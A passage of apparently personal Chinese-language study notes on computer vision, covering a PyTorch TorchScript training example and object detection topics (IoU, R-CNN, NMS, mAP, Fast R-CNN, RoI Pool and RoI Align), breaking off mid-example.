</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-cs-cv-lec11_12-__codelineno-6-2"></a><span class="k">def</span> <span class="nf">model</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">w1</span><span class="p">,</span> <span class="n">w2a</span><span class="p">,</span> <span class="n">w2b</span><span class="p">,</span> <span class="n">prev_loss</span><span class="p">):</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#note-cs-cv-lec11_12-__codelineno-6-3"></a>    <span class="n">w2</span> <span class="o">=</span> <span class="n">w2a</span> <span class="k">if</span> <span class="n">prev_loss</span> <span class="o">&lt;</span> <span class="mf">5.0</span> <span class="k">else</span> <span class="n">w2b</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#note-cs-cv-lec11_12-__codelineno-6-4"></a>    <span class="n">y_pred</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">mm</span><span class="p">(</span><span class="n">w1</span><span class="p">)</span><span class="o">.</span><span class="n">clamp</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">mm</span><span class="p">(</span><span class="n">w2</span><span class="p">)</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#note-cs-cv-lec11_12-__codelineno-6-5"></a>    <span class="n">loss</span> <span class="o">=</span> <span class="p">(</span><span class="n">y_pred</span> <span class="o">-</span> <span class="n">y</span><span class="p">)</span><span class="o">.</span><span class="n">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">sum</span><span class="p">()</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#note-cs-cv-lec11_12-__codelineno-6-6"></a>    <span class="k">return</span> <span class="n">loss</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#note-cs-cv-lec11_12-__codelineno-6-7"></a><span class="n">N</span><span class="p">,</span> <span class="n">D_in</span><span class="p">,</span> <span class="n">H</span><span class="p">,</span> <span class="n">D_out</span> <span class="o">=</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">10</span>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#note-cs-cv-lec11_12-__codelineno-6-8"></a><span class="n">x</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">D_in</span><span class="p">)</span>
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#note-cs-cv-lec11_12-__codelineno-6-9"></a><span class="n">y</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="n">D_out</span><span class="p">)</span>
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#note-cs-cv-lec11_12-__codelineno-6-10"></a><span class="n">w1</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">D_in</span><span class="p">,</span> <span class="n">H</span><span class="p">,</span> <span class="n">requires_grad</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#note-cs-cv-lec11_12-__codelineno-6-11"></a><span class="n">w2a</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">H</span><span class="p">,</span> <span class="n">D_out</span><span class="p">,</span> <span class="n">requires_grad</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#note-cs-cv-lec11_12-__codelineno-6-12"></a><span class="n">w2b</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">randn</span><span class="p">(</span><span class="n">H</span><span class="p">,</span> <span class="n">D_out</span><span class="p">,</span> <span class="n">requires_grad</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#note-cs-cv-lec11_12-__codelineno-6-13"></a>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#note-cs-cv-lec11_12-__codelineno-6-14"></a><span class="n">graph</span> <span class="o">=</span> <span class="n">torch</span><span class="o">.</span><span class="n">jit</span><span class="o">.</span><span class="n">script</span><span class="p">(</span><span class="n">model</span><span class="p">)</span><span class="c1">#使用 torch.jit.script 将 model 函数转换为 TorchScript。</span>
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#note-cs-cv-lec11_12-__codelineno-6-15"></a>
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#note-cs-cv-lec11_12-__codelineno-6-16"></a><span class="n">prev_loss</span> <span class="o">=</span> <span class="mf">5.0</span>
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#note-cs-cv-lec11_12-__codelineno-6-17"></a><span class="n">learning_rate</span> <span class="o">=</span> <span class="mf">1e-6</span>
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#note-cs-cv-lec11_12-__codelineno-6-18"></a><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#note-cs-cv-lec11_12-__codelineno-6-19"></a>    <span class="n">loss</span> <span class="o">=</span> <span class="n">graph</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">w1</span><span class="p">,</span> <span class="n">w2a</span><span class="p">,</span> <span class="n">w2b</span><span class="p">,</span> <span class="n">prev_loss</span><span class="p">)</span>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#note-cs-cv-lec11_12-__codelineno-6-20"></a>    <span class="n">prev_loss</span> <span class="o">=</span> <span class="n">loss</span><span class="o">.</span><span class="n">item</span><span class="p">()</span>
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#note-cs-cv-lec11_12-__codelineno-6-21"></a>
</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#note-cs-cv-lec11_12-__codelineno-6-22"></a>    <span class="n">loss</span><span class="o">.</span><span class="n">backward</span><span class="p">()</span>
</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#note-cs-cv-lec11_12-__codelineno-6-23"></a>
</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#note-cs-cv-lec11_12-__codelineno-6-24"></a>    <span class="k">with</span> <span class="n">torch</span><span class="o">.</span><span class="n">no_grad</span><span class="p">():</span>
</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#note-cs-cv-lec11_12-__codelineno-6-25"></a>        <span class="n">w1</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">w1</span><span class="o">.</span><span class="n">grad</span>
</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#note-cs-cv-lec11_12-__codelineno-6-26"></a>        <span class="n">w2a</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">w2a</span><span class="o">.</span><span class="n">grad</span>
</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#note-cs-cv-lec11_12-__codelineno-6-27"></a>        <span class="n">w2b</span> <span class="o">-=</span> <span class="n">learning_rate</span> <span class="o">*</span> <span class="n">w2b</span><span class="o">.</span><span class="n">grad</span>
</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28" href="#note-cs-cv-lec11_12-__codelineno-6-28"></a>        <span class="n">w1</span><span class="o">.</span><span class="n">grad</span><span class="o">.</span><span class="n">zero_</span><span class="p">()</span>
</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29" href="#note-cs-cv-lec11_12-__codelineno-6-29"></a>        <span class="n">w2a</span><span class="o">.</span><span class="n">grad</span><span class="o">.</span><span class="n">zero_</span><span class="p">()</span>
</span><span id="__span-6-30"><a id="__codelineno-6-30" name="__codelineno-6-30" href="#note-cs-cv-lec11_12-__codelineno-6-30"></a>        <span class="n">w2b</span><span class="o">.</span><span class="n">grad</span><span class="o">.</span><span class="n">zero_</span><span class="p">()</span>
</span></code></pre></div>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<ul>
<li><strong>PyTorch</strong>: 使用动态计算图，提供了更大的灵活性和易用性。</li>
<li><strong>TensorFlow</strong>: 早期版本使用静态计算图，TensorFlow 2.x 引入了 Eager Execution，支持动态计算图动态计算图的灵活性使得 PyTorch 在研究和开发中非常受欢迎，而静态计算图的优化能力使得它在某些生产环境中更具优势。</li>
</ul>
</div></section><section class="print-page" id="note-cs-cv-lec13_15" heading-number="2.4.5.11"><h1 id="note-cs-cv-lec13_15-object-detection">Object Detection<a class="headerlink" href="#note-cs-cv-lec13_15-object-detection" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 8975 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 33 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 31 分钟</p>
</div>
<h2 id="note-cs-cv-lec13_15-introduction">Introduction<a class="headerlink" href="#note-cs-cv-lec13_15-introduction" title="Permanent link">&para;</a></h2>
<p>物体检测：</p>
<ul>
<li>分类问题：判断图片中是否存在某个物体</li>
<li>检测问题：判断图片中存在哪些物体，并给出它们的位置</li>
</ul>
<p>Input: RGB image
Output: </p>
<ul>
<li>Class</li>
<li>Bounding box</li>
</ul>
<figure>

<img alt="" src="../NOTE/CS/CV/img/lec13-1.png" />

</figure>
<p>与图像分类不同，物体检测需要输出多个物体的位置和类别。</p>
<ul>
<li>Multiple outputs</li>
<li>Multiple types of output </li>
</ul>
<div class="admonition info">
<p class="admonition-title">Modal vs. Amodal boxes</p>
<p>一般的检测框只考虑物体在图片中的位置，而Amodal boxes则需要考虑整个物体在图片中的位置。</p>
<figure markdown="span">
<p><img alt="" src="../NOTE/CS/CV/img/lec13-2.png" /></p>
</figure>
</div>
<h2 id="note-cs-cv-lec13_15-iou">IoU<a class="headerlink" href="#note-cs-cv-lec13_15-iou" title="Permanent link">&para;</a></h2>
<p>IoU（Intersection over Union）是用于评估物体检测模型性能的重要指标。它用于衡量预测边界框与真实边界框之间的重叠程度。</p>
<div class="arithmatex">\[
\text{IoU} = \frac{\text{Area of Overlap}}{\text{Area of Union}}
\]</div>
<ul>
<li><strong>Area of Overlap</strong> ：预测框和真实框重叠部分的面积。</li>
<li><strong>Area of Union</strong> 预测框和真实框的总面积（即两个框的面积之和减去重叠部分的面积）。</li>
</ul>
<p>IoU 的值介于 0 和 1 之间，值越接近 1 表示预测框与真实框的重叠程度越高。通常在物体检测任务中，会设定一个阈值（如 0.5）来判断预测是否为正确检测。</p>
<figure>

<img alt="" src="../NOTE/CS/CV/img/lec13-3.png" />

</figure>
<p>一般而言，IoU 的阈值为 0.5 时，可以认为预测框与真实框的重叠程度较高。大于0.7时，已经是很好的检测了，大于0.9时，几乎可以认为预测框与真实框是相同的。</p>
<h2 id="note-cs-cv-lec13_15-detecting">Detecting<a class="headerlink" href="#note-cs-cv-lec13_15-detecting" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec13_15-single-object">Single object<a class="headerlink" href="#note-cs-cv-lec13_15-single-object" title="Permanent link">&para;</a></h3>
<figure>

<img alt="" src="../NOTE/CS/CV/img/lec13-4.png" />

<figcaption>
Single object detection
</figcaption>
</figure>
<p>首先输入图片到一个预训练的CNN模型(Tranfer Learning)，然后得到一个特征向量，将其通过两个神经网络分别得到分类结果和位置结果(一般是四个值,x,y,w,h,表示中心坐标和宽高)。将两个结果分别计算损失函数，然后相加，再加上正则化项，得到总的损失函数。</p>
<p>但是这样的问题是，如果图片中存在多个物体，那么每个图片需要预测的输出数量是不同的，这样就无法使用一个固定的神经网络来处理所有图片。</p>
<h3 id="note-cs-cv-lec13_15-multiple-objects">Multiple objects<a class="headerlink" href="#note-cs-cv-lec13_15-multiple-objects" title="Permanent link">&para;</a></h3>
<h4 id="note-cs-cv-lec13_15-sliding-window">Sliding Window<a class="headerlink" href="#note-cs-cv-lec13_15-sliding-window" title="Permanent link">&para;</a></h4>
<p>在滑动窗口方法中，将 CNN 应用于图像的多个不同裁剪，CNN 将每个裁剪分类为物体或背景。</p>
<p>依次将裁剪后的部分输入到CNN模型中，然后得到分类结果和位置结果，并加上一个额外的类别作为背景。</p>
<figure>

<img alt="" src="../NOTE/CS/CV/img/lec13-5.png" />

</figure>
<ul>
<li>考虑一个大小为 <span class="arithmatex">\(h \times w\)</span> 的框：</li>
<li>可能的 x 位置：<span class="arithmatex">\(W - w + 1\)</span></li>
<li>可能的 y 位置：<span class="arithmatex">\(H - h + 1\)</span></li>
<li>可能的位置总数：<span class="arithmatex">\((W - w + 1) \times (H - h + 1)\)</span></li>
</ul>
<div class="arithmatex">\[
\sum_{h=1}^{H} \sum_{w=1}^{W} (W - w + 1)(H - h + 1) = \frac{H(H + 1)W(W + 1)}{4}
\]</div>
<ul>
<li>对于一个 <span class="arithmatex">\(800 \times 600\)</span> 的图像，大约有 5800 万个框</li>
<li>无法评估所有这些框。</li>
</ul>
<h4 id="note-cs-cv-lec13_15-region-proposals">Region Proposals<a class="headerlink" href="#note-cs-cv-lec13_15-region-proposals" title="Permanent link">&para;</a></h4>
<p>Region Proposal 方法通过使用预训练的卷积神经网络（CNN）来生成候选区域，这些候选区域可能包含物体。</p>
<p>一般来说，Region Proposal 方法可以在CPU上运行；</p>
<p>然后真实框的生成是根据Region Proposal 方法生成的候选区域，然后通过IoU来判断是否为真实框。</p>
<figure>

<img alt="" src="../NOTE/CS/CV/img/lec13-6.png" />

</figure>
<h3 id="note-cs-cv-lec13_15-r-cnn">R-CNN<a class="headerlink" href="#note-cs-cv-lec13_15-r-cnn" title="Permanent link">&para;</a></h3>
<p>R-CNN（Region-based Convolutional Neural Network）是第一个基于Region Proposal的物体检测方法，由Ross Girshick等人于2014年提出。</p>
<p>R-CNN的工作流程包括以下步骤：</p>
<ol>
<li>
<p><strong>区域提议（Region Proposal）</strong>  ：使用选择性搜索（Selective Search）算法生成约2000个可能包含物体的候选区域。</p>
</li>
<li>
<p><strong>特征提取</strong>：对每个候选区域，将其裁剪并缩放到固定大小（如227×227），然后通过预训练的CNN（如AlexNet）提取特征。</p>
</li>
<li>
<p><strong>分类</strong>：对CNN提取的特征进行分类，确定每个区域属于哪一类物体或背景。</p>
</li>
<li>
<p><strong>边界框回归</strong>：使用回归器对边界框位置进行微调，使其更准确地包围物体。</p>
</li>
</ol>
<figure>

<img alt="" src="../NOTE/CS/CV/img/lec13-7.png" />

<figcaption>R-CNN架构</figcaption>
</figure>
<p>在边界框回归(Box Regression)中,其过程一般是这样的:</p>
<p>首先对于一个候选区域(Region Proposal生成的)，假设其中心位置为 <span class="arithmatex">\( (p_x, p_y) \)</span>，宽为 <span class="arithmatex">\( p_w \)</span>，高为 <span class="arithmatex">\( p_h \)</span>，其预测的中心位置为 <span class="arithmatex">\( (x, y) \)</span>，宽为 <span class="arithmatex">\( w \)</span>，高为 <span class="arithmatex">\( h \)</span>。</p>
<p>假设回归时调整的四个参数为 <span class="arithmatex">\( (t_x, t_y, t_w, t_h) \)</span>，那么其回归的公式为：</p>
<div class="arithmatex">\[
    x' = p_x + t_x \cdot p_w
\]</div>
<div class="arithmatex">\[
    y' = p_y + t_y \cdot p_h
\]</div>
<div class="arithmatex">\[
    w' = p_w \cdot e^{t_w}
\]</div>
<div class="arithmatex">\[
    h' = p_h \cdot e^{t_h}
\]</div>
<p>即对于中心位置，进行一个平移，对于宽高，进行一个缩放。</p>
<h4 id="note-cs-cv-lec13_15-categorize-region-proposals">Categorize region proposals<a class="headerlink" href="#note-cs-cv-lec13_15-categorize-region-proposals" title="Permanent link">&para;</a></h4>
<p>在R-CNN训练过程中，需要对每个候选区域（Region Proposal）进行分类，确定它们是前景（包含目标物体）还是背景。这个分类过程基于候选区域与真实标注边界框（Ground Truth Box）之间的IoU值。</p>
<p>根据IoU值，候选区域被分为三类：</p>
<ul>
<li><strong>GT box</strong> ：真实区域</li>
<li><strong>正样本（Positive）</strong> ：与某个真实标注框的IoU &gt; 0.5的区域，一般来说这种样本可以确定物体</li>
<li><strong>负样本（Negative）</strong> ：与所有真实标注框的IoU &lt; 0.3的区域，一般来说这种样本可以确定为背景</li>
<li><strong>中性样本（Neutral）</strong> ：IoU值在0.3到0.5之间的区域，一般来说这种样本可能是包含了物体的一部分，不太准确，但又不完全是背景。</li>
</ul>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-8.png" />

<figcaption>R-CNN中区域提议的分类</figcaption>
</figure>
<p>在训练过程中，正样本用于学习特定类别的特征，负样本用于学习背景类别的特征，而中性样本通常在训练中被忽略，因为它们既不是很好的正样本也不是很好的负样本，可能会引入噪声。</p>
<p>对于每个正样本，R-CNN使用其对应的真实标注框类别作为训练标签；对于负样本，则将其标记为"背景"类别。这种分类策略有助于模型学习区分目标物体和背景，提高检测精度。</p>
<p>在测试过程中，分为以下三个步骤</p>
<ul>
<li>生成候选区域</li>
<li>对于每个候选区域，使用RCNN模型得到分类的分数和位置的回归结果</li>
<li>调整分类阈值，得到最终的检测结果</li>
</ul>
<p>但是有以下两个问题</p>
<ul>
<li>预测的结果经常会出现重复的框</li>
<li>如何设置阈值？</li>
</ul>
<h4 id="note-cs-cv-lec13_15-nms">NMS<a class="headerlink" href="#note-cs-cv-lec13_15-nms" title="Permanent link">&para;</a></h4>
<p>非极大值抑制(Non-Maximum Suppression, NMS)是物体检测后处理的重要技术，用于解决检测算法可能产生的多个重叠边界框问题。</p>
<p><strong>问题</strong>：物体检测器通常会为同一个物体生成多个重叠的检测框，尤其是当使用区域提议方法时。</p>
<p><strong>解决方案</strong>：使用非极大值抑制对原始检测结果进行后处理，保留最可能的检测框，删除冗余的检测框。</p>
<p>NMS算法步骤：</p>
<ol>
<li>选择具有最高置信度分数的检测框</li>
<li>删除与该框IoU大于设定阈值(例如0.7)的所有低分框</li>
<li>如果还有检测框剩余，返回步骤1继续处理</li>
</ol>
<figure>

<img alt="" src="../NOTE/CS/CV/img/lec13-9.png" />

<figcaption>NMS示例</figcaption>
</figure>
<p>在上图示例中，多个框检测到同一只狗，置信度分别为0.9、0.8、0.75和0.7。</p>
<p>首先对0.9的框进行NMS，删除与该框IoU大于0.7的所有低分框，即删除0.8的框，然后保留0.9的框。</p>
<p>然后对0.75的框进行NMS，删除与该框IoU大于0.7的所有低分框，即删除0.7的框，然后保留0.75的框。</p>
<p>没有剩下的框了，所以结束。</p>
<p>NMS是几乎所有现代物体检测系统的标准后处理步骤，它显著提高了检测的准确性和可视化结果的质量。</p>
<p><strong>R-CNN的缺点：</strong></p>
<ul>
<li><strong>速度慢</strong>：需要对每个候选区域单独进行特征提取，计算量大。一张图像的处理时间约为47秒。</li>
<li><strong>训练复杂</strong>：分为多个阶段，需要分别训练CNN、SVM和边界框回归器。</li>
<li><strong>存储需求大</strong>：需要存储所有候选区域的特征。</li>
</ul>
<p>尽管存在这些缺点，R-CNN作为深度学习在物体检测领域的早期应用，奠定了后续Fast R-CNN、Faster R-CNN等方法的基础。</p>
<h3 id="note-cs-cv-lec13_15-evaluating-object-detectors">Evaluating Object Detectors<a class="headerlink" href="#note-cs-cv-lec13_15-evaluating-object-detectors" title="Permanent link">&para;</a></h3>
<h4 id="note-cs-cv-lec13_15-mean-average-precision-map">Mean Average Precision (mAP)<a class="headerlink" href="#note-cs-cv-lec13_15-mean-average-precision-map" title="Permanent link">&para;</a></h4>
<p>平均精度均值(Mean Average Precision, mAP)是评估物体检测模型性能最常用的指标。它综合考虑了模型的精确率(Precision)和召回率(Recall)。</p>
<div class="admonition note">
<p class="admonition-title">计算mAP的步骤</p>
<ul>
<li>在所有测试图像上运行物体检测器(应用NMS后)</li>
<li>对于每个类别，计算平均精度(Average Precision, AP)：<ul>
<li>AP = 精确率-召回率曲线下的面积</li>
<li>具体计算过程：<ul>
<li>将该类别的所有检测结果按置信度分数从高到低排序</li>
<li>依次处理每个检测结果：</li>
<li>如果检测与某个真实边界框(GT box)的IoU &gt; 0.5，则标记为正样本(TP)，并从考虑列表中移除该GT box</li>
<li>否则标记为负样本(FP)</li>
<li>根据累积的TP和FP，计算每个检测点的精确率和召回率</li>
<li>绘制PR曲线并计算曲线下面积</li>
</ul>
</li>
<li>计算所有类别AP值的平均值，得到mAP</li>
</ul>
</li>
</ul>
</div>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-10.png" />

<figcaption>PR曲线和检测结果排序</figcaption>
</figure>
<p>上面的例子中，其过程是这样的，首先，对于最高的0.99的框，其match了一个GT box，将这个GT box从考虑列表中移除，此时</p>
<ul>
<li>Precision = 1/1 = 1</li>
<li>Recall = <span class="arithmatex">\(\frac{1}{3}\)</span></li>
</ul>
<p>所以在图中第一个点为(1, <span class="arithmatex">\(\frac{1}{3}\)</span>)</p>
<p>接下来，对于0.95的框，也match了一个GT box，将这个GT box从考虑列表中移除，此时</p>
<ul>
<li>Precision = <span class="arithmatex">\(\frac{2}{2} = 1\)</span></li>
<li>Recall = <span class="arithmatex">\(\frac{2}{3}\)</span></li>
</ul>
<p>所以在图中第二个点为(1, <span class="arithmatex">\(\frac{2}{3}\)</span>)</p>
<p>对于0.90的框，其没有match任何GT box，所以此时</p>
<ul>
<li>Precision = <span class="arithmatex">\(\frac{2}{3}\)</span></li>
<li>Recall = <span class="arithmatex">\(\frac{2}{3}\)</span></li>
</ul>
<p>所以在图中第三个点为(<span class="arithmatex">\(\frac{2}{3}\)</span>, <span class="arithmatex">\(\frac{2}{3}\)</span>)</p>
<p>对于0.5的框，其没有match任何GT box，所以此时</p>
<ul>
<li>Precision = <span class="arithmatex">\(\frac{2}{4}\)</span></li>
<li>Recall = <span class="arithmatex">\(\frac{2}{3}\)</span></li>
</ul>
<p>所以在图中第四个点为(<span class="arithmatex">\(\frac{2}{4}\)</span>, <span class="arithmatex">\(\frac{2}{3}\)</span>)</p>
<p>最后一个点，对于0.1的框，其match最后的GT box，所以此时</p>
<ul>
<li>Precision = <span class="arithmatex">\(\frac{3}{5}\)</span></li>
<li>Recall = <span class="arithmatex">\(\frac{3}{3}\)</span></li>
</ul>
<p>所以在图中第五个点为(<span class="arithmatex">\(\frac{3}{5}\)</span>, <span class="arithmatex">\(\frac{3}{3}\)</span>)</p>
<p>然后计算PR曲线下面积，即AP，为0.86</p>
<p>作为例子，上图显示"狗"类别的AP为0.86，表示该模型在检测狗方面有较好的性能。最终的mAP值将是所有类别AP值的平均。即例如APdog = 0.86, APcar = 0.75, APbike = 0.64, 那么mAP = <span class="arithmatex">\(\frac{APdog + APcar + APbike}{3}\)</span> = 0.75</p>
<p><strong>注意事项：</strong></p>
<ul>
<li>
<p>要获得AP=1.0，模型必须检测到所有IoU&gt;0.5的GT boxes，且不存在任何"假阳性"检测结果排在"真阳性"之，即若有n个GT box，那么模型需要检测到n个TP，且不存在任何FP排在TP之前。</p>
</li>
<li>
<p>mAP可以在不同IoU阈值下计算，常见的有IoU=0.5(称为mAP@0.5)和IoU=0.5:0.95(多个IoU阈值的平均，如COCO数据集)</p>
</li>
<li>
<p>较高的mAP值表示检测器在精确率和召回率方面都有良好表现</p>
</li>
</ul>
<h2 id="note-cs-cv-lec13_15-object-detectors">Object Detectors<a class="headerlink" href="#note-cs-cv-lec13_15-object-detectors" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec13_15-fast-r-cnn">Fast R-CNN<a class="headerlink" href="#note-cs-cv-lec13_15-fast-r-cnn" title="Permanent link">&para;</a></h3>
<p>Fast R-CNN是R-CNN的改进版本</p>
<p>Fast R-CNN的工作流程包括以下步骤：</p>
<ol>
<li>
<p><strong>特征提取</strong> ：整个输入图像通过"backbone"网络（如AlexNet、VGG、ResNet等）一次性提取特征，生成特征图</p>
</li>
<li>
<p><strong>区域提议</strong> ：使用某种区域提议方法（如Selective Search）生成候选区域（RoIs）</p>
</li>
<li>
<p><strong>RoI池化</strong> ：对每个候选区域在特征图上进行裁剪和调整大小操作</p>
</li>
<li>
<p><strong>特征分类与回归</strong> ：将处理后的特征通过一个每区域网络(Per-Region Network)，最终输出每个区域的类别(Class)和边界框(Bbox)位置</p>
</li>
</ol>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-11.png" /> { width=70% }

<figcaption>Fast R-CNN架构</figcaption>
</figure>
<h4 id="note-cs-cv-lec13_15-roi-pooling">RoI Pooling<a class="headerlink" href="#note-cs-cv-lec13_15-roi-pooling" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-12.png" />

<figcaption>RoI Pooling</figcaption>
</figure>
<p>这张图片展示了Fast R-CNN中的RoI Pool（区域兴趣池化）操作，这是Fast R-CNN的核心创新之一。</p>
<ul>
<li>
<p>输入图像（Input Image），尺寸例如3×640×480，显示一只小猫的照片，绿色方框代表一个候选区域（Region Proposal）。</p>
</li>
<li>
<p>图像经过CNN backbone处理后得到的特征图（Image features），尺寸例如512×20×15（其中512是特征通道数）。</p>
</li>
<li>
<p>操作过程：将原始图像上的候选区域"Project proposal onto features"（投影到特征图上），即将输入图像上的区域映射到对应的特征图位置。</p>
</li>
<li>
<p>目标："Want features for the box of a fixed size"（想要获得固定大小的特征表示）：</p>
<ul>
<li>在这个例子中是2×2大小</li>
<li>在实际应用中通常是7×7或14×14</li>
</ul>
</li>
</ul>
<p>RoI Pool的关键作用是：</p>
<ul>
<li>将不同大小的候选区域统一转换为固定大小的特征表示</li>
<li>这样后续的全连接层就可以处理固定维度的输入</li>
<li>大大提高了计算效率，因为整个图像只需要通过CNN一次</li>
</ul>
<p>这种操作解决了R-CNN中每个区域都需要单独通过CNN的低效问题，是Fast R-CNN速度快的关键原因之一。</p>
<h4 id="note-cs-cv-lec13_15-roi-align">ROI Align<a class="headerlink" href="#note-cs-cv-lec13_15-roi-align" title="Permanent link">&para;</a></h4>
<p>RoI Align是对RoI Pool的改进版本，主要解决了RoI Pool中的量化误差问题。</p>
<ol>
<li>
<p><strong>无四舍五入操作</strong>：No snapping!，意味着RoI Align不像RoI Pool那样对区域坐标进行四舍五入，而是保留精确的浮点数位置。</p>
</li>
<li>
<p><strong>双线性插值采样</strong>：在每个子区域中使用规则间隔的采样点，通过双线性插值(bilinear interpolation)来计算这些点的特征值,而不必进行四舍五入。</p>
</li>
<li>
<p><strong>更精确的特征提取</strong>：图中右侧展示了如何计算一个采样点(x,y)的特征值：</p>
</li>
<li>找到该点周围的四个网格单元(如f6,5、f7,5、f6,6、f7,6)</li>
<li>根据距离计算权重，进行加权平均</li>
<li>例如：f6.5,5.8 = (f6,5 * 0.5 * 0.2) + (f7,5 * 0.5 * 0.2) + (f6,6 * 0.5 * 0.8) + (f7,6 * 0.5 * 0.8)</li>
</ol>
<figure>
<img alt="" src="../NOTE/CS/CV/img/lec13-13.png" width="400" />
<img alt="" src="../NOTE/CS/CV/img/lec13-14.png" width="400" />
</figure>
<ul>
<li><strong>避免了量化误差</strong>：不再强制将浮点坐标四舍五入到整数位置</li>
<li><strong>保留了更多空间信息</strong>：通过插值计算特征值，而不是直接max pooling</li>
<li><strong>提高了检测精度</strong>：特别是对小物体和需要精确定位的任务效果明显</li>
</ul>
<details class="example">
<summary>Example</summary>
<p>当我们有一个特征图和一个感兴趣区域(RoI)时，需要从特征图中提取该区域的特征，并将其转换为固定大小（例如7×7）。</p>
<p>第1步：映射RoI到特征图</p>
<ul>
<li>假设原始图像中有一个物体边界框（例如左上角坐标为(20,30)，右下角为(180,240)）</li>
<li>由于图像经过CNN后特征图变小了（比如缩小了16倍），这个边界框在特征图上的坐标变为：(1.25, 1.875)到(11.25, 15)</li>
<li><strong>注意</strong> : RoI Pool会将这些坐标四舍五入为整数，而RoI Align保留精确的浮点数坐标</li>
</ul>
